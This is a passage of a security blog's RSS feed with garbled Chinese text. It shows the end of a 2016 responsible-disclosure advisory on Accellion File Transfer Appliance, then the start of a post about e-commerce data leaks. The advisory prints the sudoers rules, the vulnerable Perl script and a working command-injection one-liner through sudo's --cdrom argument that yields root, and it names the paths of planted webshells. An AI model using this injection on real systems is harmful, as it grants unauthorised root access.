&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_CLIENT = &lt;span class=&quot;sx&quot;&gt;/usr/local/bin/yum-client.pl&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;=(ALL) &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;admin&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
&lt;span class=&quot;nb&quot;&gt;nobody&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;soggycat&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;radmin&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ YUM_CLIENT å°±æ˜¯é€²è¡Œæ›´æ–°çš„æŒ‡ä»¤ï¼Œéƒ¨åˆ†ä»£ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;help&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;download_only&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;list&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;clearcache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cdrom=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;appid=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;servername=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;version=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;token=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/usr/bin/yum&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -C&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.status&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/etc/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;/home/seos/log/yum.diff&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf-5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop $cdrom $cdrom_path&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;unable to mount: $!&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æ·±å…¥è§€å¯Ÿ &lt;code class=&quot;highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; å¾Œå¯ç™¼ç¾åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt; åƒæ•¸ä¸Šå­˜åœ¨ Command Injectionï¼Œä½¿å¾—æ”»æ“Šè€…å¯å°‡ä»»æ„æŒ‡ä»¤æ’å…¥åƒæ•¸å…§ä¸¦ä»¥ root èº«åˆ†åŸ·è¡Œ&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo /usr/local/bin/yum-client.pl --cdrom&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;$(id &amp;gt; /tmp/.gg)&amp;#39;&lt;/span&gt;
mount: can&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å³å¯ä»¥ root èº«åˆ†åŸ·è¡Œä»»æ„æŒ‡ä»¤ï¼&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¾Œé–€&quot;&gt;å¾Œé–€&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
åœ¨å–å¾—æœ€é«˜æ¬Šé™å¾Œï¼Œé–‹å§‹å°ä¼ºæœå™¨é€²è¡Œä¸€äº›å¯©è¦–æ™‚ï¼Œç™¼ç¾å·²æœ‰å¹¾æ¬¾å¾Œé–€è—åœ¨ FTA ä¸»æ©Ÿä¸­äº†ï¼Œç¶“éç ”ç©¶å¾Œé¦–å…ˆç¢ºèªä¸€æ¬¾ IRC BOT ç‚º Niara æ‰€ç™¼å¸ƒçš„ &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;å¼±é»å ±å‘Š&lt;/a&gt; ä¸­æœ‰æåŠï¼Œæ­¤å¤–ï¼Œé¡å¤–ç™¼ç¾å…©æ¬¾ä¸åŒé¡å‹çš„ PHP Webshell ä¸¦ç„¡åœ¨å…¬é–‹çš„å ±å‘Šä¸­ç™¼ç¾ï¼Œé€é Apache Log æ™‚é–“æ¨æ¸¬æ‡‰è©²æ˜¯é€é 2015 å¹´ä¸­çš„ CVE-2015-2857 æ‰€æ”¾ç½®ä¹‹å¾Œé–€ã€‚&lt;/p&gt;

&lt;p&gt;PHPSPY å¾Œé–€ï¼Œå…¨çƒ 1217 å°å­˜æ´»ä¸»æ©Ÿä¸Šå…±ç™¼ç¾ 62 å°ï¼Œæ”¾ç½®è·¯å¾‘æ–¼ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WSO å¾Œé–€ï¼Œå…¨çƒ 1217 å°å­˜æ´»ä¸»æ©Ÿä¸Šå…±ç™¼ç¾ 9 å°ï¼Œæ”¾ç½®è·¯å¾‘æ–¼ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;è‡´è¬&quot;&gt;è‡´è¬&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
é€™ä»½ Advisory æ‰€æåŠçš„å¼±é»ç‚ºåœ¨ 2016 äºŒæœˆæ™‚åƒåŠ  Facebook Bug Bounty æ™‚å°‹æ‰¾åˆ°çš„ï¼Œè©³æƒ…å¯åƒè€ƒæ–‡ç« ã€Š&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾&lt;/a&gt;ã€‹ï¼Œæ‰¾åˆ°å¼±é»çš„ç•¶ä¸‹ç«‹å³å›å ±åŒ…æ‹¬ Accellion åŠ Facebookï¼ŒAccellion ä¸¦åœ¨ 2/12 è™Ÿå°‡æ­¤ä»½å¼±é»è¨˜éŒ„åœ¨ FTA_9_12_40 ä¸¦é€šçŸ¥æ‰€æœ‰å—å½±éŸ¿çš„å®¢æˆ¶å®‰è£ä¿®è£œç¨‹å¼ã€‚&lt;/p&gt;

&lt;p&gt;æ„Ÿè¬ Facebook ä»¥åŠ Accellion çš„è¿…é€Ÿåæ‡‰è·Ÿé…åˆ : )&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/06 05:21 è¯çµ¡ Accellion è©¢å•ä½•è™•å¯å›å ±å¼±é»&lt;/li&gt;
  &lt;li&gt;2016/02/07 12:35 å°‡å ±å‘Šå¯„è‡³ Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/03/03 03:03 Accellion Support Team é€šçŸ¥æœƒåœ¨ FTA_9_12_40  ä¿®å¾©&lt;/li&gt;
  &lt;li&gt;2016/05/10 15:18 è©¢å•å°‡æ’°å¯« Advisory è¨±å¯åŠé€šçŸ¥ç™¼ç¾å…©æ¬¾å¾Œé–€å­˜åœ¨&lt;/li&gt;
  &lt;li&gt;2016/06/06 10:20 é›™æ–¹è¨è«–å®šç¨¿&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åƒè€ƒ&quot;&gt;åƒè€ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é›»å•†æ¥­è€…çš„è³‡å®‰å›°å¢ƒï¼Ÿ</title>
                <description>&lt;p&gt;å°ç£é›»å•†ç¶²ç«™è“¬å‹ƒç™¼å±•ï¼Œè±å¯Œçš„å€‹è³‡ã€é‡‘æµéƒ½å¸å¼•äº†æ”»æ“Šè€…ã€‚è¿‘æœŸåˆ‘äº‹å±€ 165 åè©é¨™ç¶²ç«™ä¸Šå¸¸çœ‹åˆ°å¾ˆå¤šé›»å•†ç¶²ç«™é¢è‡¨å€‹è³‡å¤–æ´©çš„å•é¡Œï¼Œæ–°èä¹Ÿä¸æ–·å ±å°æ°‘çœ¾å› ç‚ºå€‹è³‡å¤–æ´©è¢«è©é¨™é›†åœ˜é¨™å–éŒ¢è²¡ã€‚è³‡å®‰å•é¡Œæ˜¯é›»å•†æ¥­è€…é¢è‡¨åˆ°æœ€å¤§çš„å±æ©Ÿï¼Œæ°‘çœ¾ä¹Ÿå¾ˆæ†¤æ€’ç‚ºä»€éº¼é€™äº›ä¼æ¥­éƒ½ä¸è‚¯æŠŠè³‡å®‰åšå¥½ã€‚ä½†æˆ‘ç›¸ä¿¡ï¼Œé›»å•†ç¶²ç«™çš„æ¥­ä¸»ä¹Ÿæ˜¯æœ‰è‹¦é›£è¨€ã€‚ä¸å°‘ä¼æ¥­çŸ¥é“è©²æŠŠè³‡å®‰åšå¥½ï¼Œæœ‰äº›å¯èƒ½ä¸å¾—å…¶æ³•ï¼Œä¹Ÿå¯èƒ½ä»€éº¼éƒ½åšäº†ï¼Œå»é‚„æ˜¯ç„¡æ³•é˜²æ­¢è‡ªå·±çš„ç¶²ç«™å‡ºç¾åœ¨ 165 è©é¨™æ’è¡Œçš„æ¦œå–®ä¸Šã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å…§æ”¿éƒ¨è­¦æ”¿ç½² 165 åè©é¨™è«®è©¢å°ˆç·š æ°‘çœ¾é€šå ±é«˜é¢¨éšªè³£å ´æ’å  &lt;br /&gt;
&lt;a href=&quot;http://165.gov.tw/loss_rank.aspx&quot;&gt;http://165.gov.tw/loss_rank.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°æ–¼ç„¡å¿ƒæ–¼è³‡å®‰çš„æ¥­è€…ä¾†èªªï¼Œè¢«æ­éœ²é€™æ¨£çš„è³‡è¨Šæœƒæœ‰ä¸€å®šç¨‹åº¦çš„åŠ›é‡è¿«ä½¿ä»–å€‘æŠŠè³‡å®‰åšå¥½ã€‚ä½†å°æ–¼å·²ç¶“é¡§å…¨è³‡å®‰çš„æ¥­è€…ä¾†èªªï¼Œå‰‡æ˜¯æ‘¸ä¸è‘—é ­ç·’åˆ°åº•å€‹è³‡å¾å“ªé‚Šå¤–æ´©çš„ã€‚ä»Šå¤©æˆ‘å€‘å°±ä¾†è«‡è«‡ï¼Œåˆ°åº•é›»å•†ç¶²ç«™çš„è³‡å®‰å•é¡Œæ˜¯ä»€éº¼ï¼Œæ°‘çœ¾çš„å€‹è³‡åˆæ˜¯æ€éº¼å¤–æ´©çš„ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;é›»å•†ç¶²ç«™çš„å›°å¢ƒ&quot;&gt;é›»å•†ç¶²ç«™çš„å›°å¢ƒ&lt;/h3&gt;

&lt;p&gt;ç›®å‰é›»å•†ç¶²ç«™å¸¸è¦‹çš„å›°å¢ƒæœ‰å¹¾é»ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;è‡ªè¡Œé–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´&lt;/li&gt;
  &lt;li&gt;å§”å¤–é–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´ï¼Œä½†æ‰¿åŒ…å•†ä¸è™•ç†&lt;/li&gt;
  &lt;li&gt;å…§éƒ¨å“¡å·¥é›»è…¦é­å…¥ä¾µå¤–æ´©å€‹è³‡&lt;/li&gt;
  &lt;li&gt;é…åˆå» å•†å€‹è³‡å¤–æ´©ï¼Œå¦‚é‡‘æµå•†ã€ç‰©æµå•†&lt;/li&gt;
  &lt;li&gt;æ”»æ“Šè€…ç”¨å·²å¤–æ´©å¸³è™Ÿå¯†ç¢¼ç™»å…¥é›»å•†ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;è²·å®¶åœ¨è©é¨™é›†åœ˜çš„è³£å ´äº¤æ˜“&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é»‘è‰²ç”¢æ¥­çš„ç™¼å±•æ¯”å¤§å®¶æƒ³åƒä¸­éƒ½é‚„è¦ç››è¡Œï¼Œè‹¥ä¼æ¥­å°æ”»æ“Šè€…ä¾†èªªæœ‰åˆ©å¯åœ–ï¼Œé§­å®¢çµ„ç¹”æœƒä¸æ“‡æ‰‹æ®µå…¥ä¾µå–å¾—è³‡æ–™ã€‚å› æ­¤å°ç¶²ç«™æœ¬èº«ã€ç¶²ç«™å‘¨é­ç³»çµ±ã€ä¼æ¥­å…§éƒ¨å“¡å·¥ã€æˆ–è€…ä»¥ç¤¾äº¤å·¥ç¨‹æ‰‹æ³•ï¼Œåªè¦èƒ½å–å¾—è³‡æ–™éƒ½æœƒæ˜¯ä»–å€‘ä¸‹æ‰‹çš„ç›®æ¨™ã€‚&lt;/p&gt;

&lt;h4 id=&quot;è‡ªè¡Œé–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´&quot;&gt;è‡ªè¡Œé–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´&lt;/h4&gt;

&lt;p&gt;é€™æ˜¯ç›®å‰ä¼æ¥­æœ€éœ€è¦å…ˆè§£æ±ºçš„å•é¡Œã€‚è‹¥ç¶²ç«™æœ¬èº«è³‡å®‰é«”è³ªä¸å¥½ï¼Œå‰‡æœƒè¼•æ˜“è¢«æ”»æ“Šè€…å…¥ä¾µã€‚è³‡å®‰å•é¡Œå¾€å¾€éƒ½æ˜¯ä¼æ¥­å…§éƒ¨æœ€é›£è§£çš„å•é¡Œï¼Œé“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆï¼Œè‹¥æ²’æœ‰ç¶“éå®Œæ•´çš„&lt;a href=&quot;https://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;ï¼Œå‰‡é›£ä»¥æ‰¾å‡ºå•é¡Œçš„æ ¹æºã€‚æ‰¾åˆ°äº†å•é¡Œä¹‹å¾Œï¼Œé–‹ç™¼äººå“¡çš„æ•™è‚²è¨“ç·´ã€è³‡å®‰æ©Ÿåˆ¶ã€è³‡å®‰è¨­å‚™ï¼Œéƒ½æœƒæ˜¯ä¼æ¥­æ¥ä¸‹ä¾†è¦é¢å°çš„èª²é¡Œã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šæ»²é€æ¸¬è©¦ã€è³‡å®‰é¡§å•ã€æ•™è‚²è¨“ç·´&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;å§”å¤–é–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´ä½†æ‰¿åŒ…å•†ä¸è™•ç†&quot;&gt;å§”å¤–é–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´ï¼Œä½†æ‰¿åŒ…å•†ä¸è™•ç†&lt;/h4&gt;

